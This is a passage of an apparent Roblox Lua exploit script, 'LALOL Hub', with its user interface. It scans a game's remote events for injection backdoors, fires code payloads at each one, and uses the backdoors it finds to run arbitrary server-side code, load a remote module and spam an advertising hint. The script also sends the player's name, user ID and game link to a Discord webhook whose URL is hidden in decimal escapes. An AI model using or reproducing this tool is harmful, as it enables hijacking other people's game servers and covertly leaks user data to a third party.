            tostring(game.PlaceId*1337), tostring(game.PlaceId*69),
            "lalol"..game.PlaceId, "shell"..game.PlaceId,
        }
        for _, pat in ipairs(patterns) do
            local obj = RS:FindFirstChild(pat)
            if obj and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                local code = generateName(math.random(12, 30))
                runRemote(obj, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
                remotes[code] = obj
            end
        end

        -- NEW: scan multiple containers not just game:GetDescendants
        local containers = {
            game:GetService("ReplicatedStorage"),
            game:GetService("ServerStorage"),
            game:GetService("ServerScriptService"),
            workspace,
            game:GetService("StarterGui"),
            game:GetService("StarterPack"),
            game:GetService("Lighting"),
            game:GetService("Chat"),
        }

        local seen = {}
        for _, container in ipairs(containers) do
            local ok, desc = pcall(function() return container:GetDescendants() end)
            if not ok then continue end
            -- FIX: ipairs instead of generic for
            for _, remote in ipairs(desc) do
                if seen[remote] then continue end
                if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end

                -- FIX: validation
                local topLevel = string.split(remote:GetFullName(), ".")[1]
                if topLevel == "RobloxReplicatedStorage" then
                    dbg("Roblox Replicated Storage ("..remote.Name..")", 1)
                    continue
                end

                local parentName = ""
                pcall(function() parentName = remote.Parent.Name end)
                if EXCLUDE_PARENTS[parentName] then continue end
                if EXCLUDE_NAMES[remote.Name] then continue end
                if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
                    dbg("Adonis filter detected ("..remote.Name..")", 1)
                    continue
                end

                seen[remote] = true

                -- Send ALL payload types (not just Model in workspace)
                for _, payload in ipairs(PAYLOADS) do
                    local code = generateName(math.random(12, 30))
                    runRemote(remote, payload.send(code))
                    remotes[code] = {remote = remote, payload = payload}
                end

                dbg('Sent payloads to "'..remote:GetFullName()..'"', 1)
                task.wait(0.02) -- small yield to prevent freeze
            end
        end

        -- Also scan full game tree for any missed remotes
        local ok2, allDesc = pcall(function() return game:GetDescendants() end)
        if ok2 then
            -- FIX: ipairs
            for _, remote in ipairs(allDesc) do
                if seen[remote] then continue end
                if not remote:IsA("RemoteEvent") and not remote:IsA("RemoteFunction") then continue end
                local top = string.split(remote:GetFullName(), ".")[1]
                if top == "RobloxReplicatedStorage" then continue end
                local pName = ""
                pcall(function() pName = remote.Parent.Name end)
                if EXCLUDE_PARENTS[pName] or EXCLUDE_NAMES[remote.Name] then continue end

                seen[remote] = true
                local code = generateName(math.random(12, 30))
                runRemote(remote, "Instance.new('Model',workspace).Name='"..code.."'")
                remotes[code] = {remote = remote, payload = PAYLOADS[1]}
                task.wait(0.01)
            end
        end

        -- ============================================================
        -- Backdoor checker (checks ALL payloads in ALL locations)
        -- FIX: pairs() + no early exit so ALL backdoors are found
        -- ============================================================

        local firstFound = true
        for i = 1, 150 do -- increased from 100 to 150

            -- FIX: pairs() instead of generic for
            for code, entry in pairs(remotes) do
                local remote, payload

                -- Handle both old format (just remote) and new format (table)
                if type(entry) == "table" and entry.remote then
                    remote = entry.remote
                    payload = entry.payload
                else
                    remote = entry
                    payload = PAYLOADS[1]
                end

                local found = nil
                -- FIX: use payload's find function if available
                if payload and payload.find then
                    pcall(function() found = payload.find(code) end)
                else
                    found = workspace:FindFirstChild(code)
                end

                if found then
                    -- FIX: parentheses fix for string concat + math
                    notify("Backdoor found! "..(os.clock()-timee).."s")

                    -- FIX: check if already in allBackdoors
                    local alreadyFound = false
                    for _, bd in ipairs(allBackdoors) do
                        if bd == remote then alreadyFound = true; break end
                    end

                    if not alreadyFound then
                        table.insert(allBackdoors, remote)
                        backdoor = remote
                        dbg(remote:GetFullName(), 3)

                        -- Clean up test object
                        pcall(function() found:Destroy() end)

                        if firstFound then
                            firstFound = false
                            GUI.Scanner.Visible = false
                            makeVisible(GUI.Executor, true)
                            runRemote(remote, "require(171016405.1884*69)")
                            runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                        end

                        -- Webhook (in background so it doesn't block)
                        task.spawn(function()
                            local request = (syn and syn.request)
                                or (http and http.request)
                                or (type(http_request)=="function" and http_request)
                                or (fluxus and fluxus.request)
                            if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then
                                pcall(function()
                                    request({
                                        Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = HttpService:JSONEncode({
                                            username = "pls dont delete this w3bh00k",
                                            content = "**User: `"..game:GetService("Players").LocalPlayer.Name.."` | `"..game:GetService("Players").LocalPlayer.UserId.."`\nhttps://www.roblox.com/games/"..game.PlaceId.."\n`"..remote:GetFullName().."`**"
                                        })
                                    })
                                end)
                            end
                        end)
                    else
                        pcall(function() found:Destroy() end)
                    end
                end
            end

            -- FIX: task.wait() instead of wait()
            task.wait(0.05)
        end

        return #allBackdoors > 0
    end

    -- ============================================================
    -- EXECUTE BUTTON (fixed + fires ALL found backdoors)
    -- ============================================================

    GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
        local a = string.gsub(
            GUI.Executor.ExecutorBox.TextBox.Text,
            "%%username%%",
            game:GetService("Players").LocalPlayer.Name
        )

        -- Try protected backdoor
        local protected_backdoor = game:GetService("ReplicatedStorage"):FindFirstChild(
            "lh"..game.PlaceId/6666*1337*game.PlaceId
        )
        if protected_backdoor and protected_backdoor:IsA("RemoteFunction") then
            dbg("Protected backdoor found", 3)
            -- FIX: task.spawn instead of spawn
            task.spawn(function()
                local ok, result = pcall(function()
                    return protected_backdoor:InvokeServer("lalol hub join today!! discord.gg/XXqzxT7E5z", a)
                end)
                if result ~= nil then
                    local split = string.split(tostring(result), ":")
                    notify(split[#split])
                end
            end)
        end

        -- NEW: fire ALL found backdoors
        if #allBackdoors > 0 then
            for _, bd in ipairs(allBackdoors) do
                runRemote(bd, a)
                task.wait(0.02)
            end
        elseif backdoor then
            runRemote(backdoor, a)
        end

        GUI.Executor.Execute.Button.Text = "Executed!"
        -- FIX: task.wait instead of wait
        task.wait(0.5)
        GUI.Executor.Execute.Button.Text = "Execute"
    end)

    -- CLEAR BUTTON (fixed)
    GUI.Executor.Clear.Button.MouseButton1Click:Connect(function()
        GUI.Executor.ExecutorBox.TextBox.Text = ""
        GUI.Executor.Clear.Button.Text = "Cleared!"
        -- FIX: task.wait
        task.wait(0.5)
        GUI.Executor.Clear.Button.Text = "Clear"
    end)

    -- SCANNER BUTTON
    local searching = false
    GUI.Scanner.Button.MouseButton1Click:Connect(function()
        if not searching then
            searching = true
            dbg("Scanning...", 3)
            GUI.Scanner.Button.Text = "Scanning..."
            -- FIX: run in task.spawn so UI doesn't freeze
            task.spawn(function()
                if not findRemote() then
                    GUI.Scanner.Button.Text = "No backdoor :("
                    searching = false
                else
                    GUI.Scanner.Button.Text = "Found "..#allBackdoors.."!"
                end
            end)
        end
    end)

    -- ALT TOGGLE
    game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
        if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
            GUI.Visible = not GUI.Visible
        end
    end)
end)

-- ============================================================
-- C_21: DRAGIFY (exact original, fixed)
-- ============================================================

task.spawn(function()
    local UIS = game:GetService("UserInputService")

    local function dragify(Frame)
        local dragToggle = nil
        local dragInput = nil
        local dragStart = nil
        local startPos = nil

        local function updateInput(input)
            local Delta = input.Position - dragStart
            local Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + Delta.X,
                startPos.Y.Scale, startPos.Y.Offset + Delta.Y
            )
            game:GetService("TweenService"):Create(
                Frame, TweenInfo.new(0.15), {Position = Position}
            ):Play()
        end

        Frame.InputBegan:Connect(function(input)
            if (input.UserInputType == Enum.UserInputType.MouseButton1 or
                input.UserInputType == Enum.UserInputType.Touch) and
                UIS:GetFocusedTextBox() == nil then
                dragToggle = true
                dragStart = input.Position
                startPos = Frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragToggle = false
                    end
                end)
            end
        end)

        Frame.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or
               input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)

        UIS.InputChanged:Connect(function(input)
            if input == dragInput and dragToggle then
                updateInput(input)
            end
        end)
    end

    -- FIX: reference G2L["2"] directly instead of script.Parent.Frame
    dragify(G2L["2"])
end)

return G2L["1"], require
